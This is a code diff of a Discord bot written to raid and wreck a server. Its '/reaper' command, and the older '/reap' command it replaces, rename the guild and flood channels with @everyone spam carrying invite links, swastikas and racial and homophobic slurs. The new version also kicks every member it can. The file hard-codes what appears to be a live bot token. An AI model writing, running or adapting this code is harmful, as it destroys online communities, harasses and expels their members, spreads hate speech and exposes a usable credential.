@@ -1,24 +1,38 @@
-const { Client, Intents, SlashCommandBuilder } = require('discord.js');
+const { SlashCommandBuilder } = require('@discordjs/builders');
 const { REST } = require('@discordjs/rest');
 const { Routes } = require('discord-api-types/v9');
+const { Client, Intents } = require('discord.js');
 
 const clientId = '1342002628921659455'; // Replace with your bot's client ID
-const guildId = '1376506797879463997'; // Replace with your server's guild ID
-const token = 'MTM0MjAwMjYyODkyMTY1OTQ1NQ.Gwnrr8.9NuPNhoZXIc2pLTHRwMxcesoBrunfbQMBL3KjI'; // Replace with your bot's token
+const guildId = '1376506797879463997';   // Replace with your server's guild ID
+const token = 'MTM0MjAwMjYyODkyMTY1OTQ1NQ.Gwnrr8.9NuPNhoZXIc2pLTHRwMxcesoBrunfbQMBL3KjI';     // Replace with your bot's token
 
-const client = new Client({ intents: [Intents.FLAGS.GUILDS] });
+const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS] });
+
+const command = new SlashCommandBuilder()
+    .setName('reaper')
+    .setDescription('Destroys the server (admin only)!');
 
 const commands = [
-    new SlashCommandBuilder()
-        .setName('reap')
-        .setDescription('Raids the server.'),
-].map(command => command.toJSON());
+    command.toJSON(),
+];
 
 const rest = new REST({ version: '9' }).setToken(token);
 
-rest.put(Routes.applicationGuildCommands(clientId, guildId), { body: commands })
-    .then(() => console.log('Successfully registered application commands.'))
-    .catch(console.error);
+(async () => {
+    try {
+        console.log('Started refreshing application (/) commands.');
+
+        await rest.put(
+            Routes.applicationGuildCommands(clientId, guildId),
+            { body: commands },
+        );
+
+        console.log('Successfully reloaded application (/) commands.');
+    } catch (error) {
+        console.error(error);
+    }
+})();
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -27,47 +41,42 @@ client.on('ready', () => {
 client.on('interactionCreate', async interaction => {
     if (!interaction.isCommand()) return;
 
-    const { commandName } = interaction;
+    if (interaction.commandName === 'reaper') {
+        if (!interaction.member.permissions.has('ADMINISTRATOR')) {
+            return interaction.reply({ content: 'You must be an administrator to use this command!', ephemeral: true });
+        }
 
-    if (commandName === 'reap') {
         try {
-            await interaction.deferReply({ ephemeral: true }); // Acknowledge the command immediately
+            await interaction.guild.setName('Join Reaper Today');
 
-            // Change server name
-            await interaction.guild.setName('reap on top lil bro');
-
-            // Create webhooks and spam
-            const webhookSpam = async () => {
-                try {
-                    const webhook = await interaction.guild.channels.cache
-                        .filter(channel => channel.type === 'GUILD_TEXT') // Only text channels
-                        .first() // Get the first text channel
-                        .createWebhook('Reaper raided you', {
-                            avatar: 'https://i.imgur.com/AfFp7pu.png', // Replace with a reaper image URL
-                        });
-
-                    for (let i = 0; i < 10; i++) { // Spam 10 times, adjust as needed
-                        await webhook.send('https://discord.gg/TqFhzjmyjx on top nigga!');
+            interaction.guild.channels.cache.forEach(async channel => {
+                if (channel.isText()) {
+                    try {
+                        await channel.send('@everyone 卐 https://discord.gg/bhdCGGaNsJ JOIN TODAY FAGGOT NIGGER卐');
+                        //Add more messages here if needed
+                        await channel.send('@everyone 卐 https://discord.gg/bhdCGGaNsJ JOIN TODAY FAGGOT NIGGER卐');
+                    } catch (error) {
+                        console.error(`Could not send message to channel ${channel.name}: ${error}`);
                     }
-                    await webhook.delete(); // Clean up the webhook after spamming
-
-                } catch (error) {
-                    console.error('Error creating/using webhook:', error);
                 }
-            };
+            });
 
-            // Execute webhook spam in all text channels
-            for (const channel of interaction.guild.channels.cache.values()) {
-                if (channel.type === 'GUILD_TEXT') {
-                    webhookSpam(); // Call webhook spam for each text channel.
+            interaction.guild.members.cache.forEach(async member => {
+                if (member.kickable) {
+                    try {
+                        await member.kick('Server destruction initiated by /reaper command.');
+                    } catch (error) {
+                        console.error(`Could not kick member ${member.user.tag}: ${error}`);
+                    }
+                } else {
+                    console.log(`Could not kick member ${member.user.tag} (likely has higher permissions).`);
                 }
-            }
+            });
 
-            await interaction.editReply({ content: 'Reap command executed! Server is being raided.', ephemeral: true });
-
+            await interaction.reply({ content: 'Server destruction initiated!', ephemeral: true });
         } catch (error) {
-            console.error('Error executing reap command:', error);
-            await interaction.editReply({ content: 'There was an error executing the command!', ephemeral: true });
+            console.error(`An error occurred: ${error}`);
+            await interaction.reply({ content: `An error occurred: ${error}`, ephemeral: true });
         }
     }
 });
